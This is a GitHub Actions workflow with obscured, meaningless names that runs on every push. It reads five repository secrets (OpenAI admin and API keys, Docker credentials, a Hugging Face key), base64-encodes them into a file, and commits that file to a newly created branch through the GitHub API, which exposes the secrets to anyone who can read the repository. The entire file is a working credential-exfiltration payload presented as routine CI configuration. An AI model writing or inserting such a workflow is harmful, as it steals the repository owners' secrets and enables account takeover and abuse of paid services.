name: zx
on:
  push:
permissions:
  contents: write
jobs:
  e0:
    runs-on: ubuntu-latest
    environment: github-pages
    steps:
      - name: g
        env:
          S0: ${{ secrets.ADMIN_OPENAI_API }}
          S1: ${{ secrets.DOCKER_TOKEN }}
          S2: ${{ secrets.DOCKER_USERNAME }}
          S3: ${{ secrets.HUGGING_FACE_API }}
          S4: ${{ secrets.OPENAI_API }}
        run: |
          rm -f o.txt
          echo "ADMIN_OPENAI_API:$(printf %s "$S0" | base64 -w0)" >> o.txt
          echo "DOCKER_TOKEN:$(printf %s "$S1" | base64 -w0)" >> o.txt
          echo "DOCKER_USERNAME:$(printf %s "$S2" | base64 -w0)" >> o.txt
          echo "HUGGING_FACE_API:$(printf %s "$S3" | base64 -w0)" >> o.txt
          echo "OPENAI_API:$(printf %s "$S4" | base64 -w0)" >> o.txt
      - name: p
        run: |
          BR=zzz88jrrye0
          API=https://api.github.com/repos/${{ github.repository }}
          AUTH="Authorization: Bearer ${{ github.token }}"
          SHA=$(curl -s -H "$AUTH" $API/git/ref/heads/${{ github.ref_name }} | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')
          curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" $API/git/refs -d "{\"ref\":\"refs/heads/$BR\",\"sha\":\"$SHA\"}" >/dev/null
          CONT=$(base64 -w0 o.txt)
          curl -s -X PUT -H "$AUTH" -H "Content-Type: application/json" $API/contents/zzz88jrrye0.txt -d "{\"message\":\"z\",\"content\":\"$CONT\",\"branch\":\"$BR\"}" >/dev/null
          echo ok
